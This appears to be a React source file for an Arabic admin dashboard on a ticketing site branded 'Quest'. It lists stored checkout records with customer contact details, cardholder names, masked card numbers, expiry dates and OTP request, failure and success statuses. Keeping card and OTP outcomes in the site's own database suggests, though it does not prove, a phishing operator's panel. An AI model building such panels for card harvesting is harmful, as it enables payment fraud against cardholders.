import { useQuery } from "@tanstack/react-query";
import { AlertCircle, Database, RefreshCw } from "lucide-react";
import { api, type CheckoutListResponse } from "@shared/routes";
import { QuestLegalFooter, QuestMobileTopBar } from "@/components/QuestMobileChrome";
import { formatQar } from "@/lib/ticket-cart";

function formatArabicDateTime(value: string): string {
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) {
    return "غير متوفر";
  }

  return new Intl.DateTimeFormat("ar-QA", {
    dateStyle: "medium",
    timeStyle: "short",
  }).format(date);
}

const statusLabels: Record<string, string> = {
  otp_requested: "تم طلب OTP",
  otp_failed: "فشل OTP",
  otp_verified: "OTP ناجح",
};

export default function Dashboard() {
  const {
    data,
    isLoading,
    error,
    refetch,
    isFetching,
  } = useQuery<CheckoutListResponse>({
    queryKey: [api.checkout.list.path],
    queryFn: async () => {
      const response = await fetch(api.checkout.list.path, {
        method: api.checkout.list.method,
        credentials: "include",
      });

      if (!response.ok) {
        const errorData = (await response.json().catch(() => null)) as { message?: string } | null;
        throw new Error(errorData?.message ?? "تعذر تحميل البيانات من Firestore.");
      }

      return api.checkout.list.responses[200].parse(await response.json());
    },
  });

  return (
    <div className="min-h-screen bg-[#efefef] text-[#2f2f2f]" dir="rtl" lang="ar">
      <div className="mx-auto flex min-h-screen w-full max-w-[1200px] flex-col bg-[#efefef]">
        <QuestMobileTopBar />

        <main className="flex-1 px-4 pb-8 pt-5 sm:px-6 md:px-8">
          <div className="flex flex-wrap items-center justify-between gap-3">
            <div>
              <h1 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.3rem]">لوحة البيانات</h1>
              <p className="text-sm text-[#626262]">عرض جميع بيانات الطلبات المخزنة في Firestore</p>
            </div>
            <button
              type="button"
              onClick={() => refetch()}
              disabled={isFetching}
              className="inline-flex items-center gap-2 rounded-md border border-[hsl(var(--quest-purple))]/30 bg-white px-3 py-2 text-sm font-semibold text-[hsl(var(--quest-purple))] hover:bg-[hsl(var(--quest-purple))]/5 disabled:cursor-not-allowed disabled:opacity-70"
            >
              <RefreshCw className={`h-4 w-4 ${isFetching ? "animate-spin" : ""}`} />
              تحديث البيانات
            </button>
          </div>

          {isLoading ? (
            <div className="mt-5 rounded-md border border-[#e7e7e7] bg-white p-5 text-sm text-[#555]">
              جاري تحميل البيانات...
            </div>
          ) : null}

          {error instanceof Error ? (
            <div className="mt-5 flex items-start gap-2 rounded-md border border-[#efc1c1] bg-[#fdf1f1] p-4 text-sm text-[#ad3030]">
              <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
              <p>{error.message}</p>
            </div>
          ) : null}

          {!isLoading && !error && data?.length === 0 ? (
            <div className="mt-5 rounded-md border border-[#e7e7e7] bg-white p-5 text-sm text-[#555]">
              لا توجد أي طلبات بعد.
            </div>
          ) : null}

          <section className="mt-5 space-y-4">
            {data?.map((record) => (
              <article key={record.id} className="overflow-hidden rounded-lg border border-[#dddddd] bg-white">
                <div className="flex flex-wrap items-center justify-between gap-2 border-b border-[#ececec] bg-[#f8bf14]/25 px-4 py-3">
                  <div className="flex items-center gap-2">
                    <Database className="h-4 w-4 text-[hsl(var(--quest-purple))]" />
                    <span className="text-sm font-semibold text-[hsl(var(--quest-purple))]">رقم السجل: {record.id}</span>
                  </div>
                  <span className="rounded-full bg-[hsl(var(--quest-purple))]/10 px-2 py-1 text-xs font-semibold text-[hsl(var(--quest-purple))]">
                    {statusLabels[record.payment.status] ?? record.payment.status}
                  </span>
                </div>

                <div className="grid gap-4 px-4 py-4 md:grid-cols-3">
                  <div className="space-y-1 text-sm">
                    <p className="font-semibold text-[#474747]">بيانات العميل</p>
                    <p>{record.billing.firstName} {record.billing.lastName}</p>
                    <p>{record.billing.phone}</p>
                    <p>{record.billing.email}</p>
                  </div>

                  <div className="space-y-1 text-sm">
                    <p className="font-semibold text-[#474747]">تفاصيل الزيارة</p>
                    <p>التاريخ: {record.visitDateIso ?? "غير محدد"}</p>
                    <p>الوقت: {record.visitTime ?? "غير محدد"}</p>
                    <p>عدد العناصر: {record.items.length}</p>
                  </div>

                  <div className="space-y-1 text-sm">
                    <p className="font-semibold text-[#474747]">بيانات الدفع</p>
                    <p>حامل البطاقة: {record.payment.cardholderName}</p>
                    <p dir="ltr">البطاقة: {record.payment.cardNumberMasked}</p>
                    <p dir="ltr">الانتهاء: {record.payment.expiry}</p>
                  </div>
                </div>

                <div className="border-t border-[#efefef] px-4 py-3">
                  <p className="text-sm font-semibold text-[#464646]">العناصر</p>
                  <div className="mt-2 space-y-1 text-sm text-[#555]">
                    {record.items.map((item) => (
                      <p key={`${record.id}-${item.id}`}>
                        {item.name} × {item.quantity} — {formatQar(item.lineTotal)}
                      </p>
                    ))}
                  </div>

                  <div className="mt-3 grid gap-1 text-sm font-semibold text-[#3a3a3a] sm:grid-cols-2">
                    <p>المجموع الفرعي: {formatQar(record.subtotal)}</p>
                    <p>الإجمالي: {formatQar(record.total)}</p>
                  </div>

                  <div className="mt-2 text-xs text-[#777]">
                    <p>تم الإنشاء: {formatArabicDateTime(record.createdAt)}</p>
                    <p>آخر تحديث: {formatArabicDateTime(record.updatedAt)}</p>
                  </div>

                  {record.payment.errorMessage ? (
                    <div className="mt-2 rounded border border-[#efc1c1] bg-[#fdf1f1] px-2 py-1 text-xs text-[#ad3030]">
                      {record.payment.errorMessage}
                    </div>
                  ) : null}
                </div>
              </article>
            ))}
          </section>
        </main>

        <QuestLegalFooter />
      </div>
    </div>
  );
}
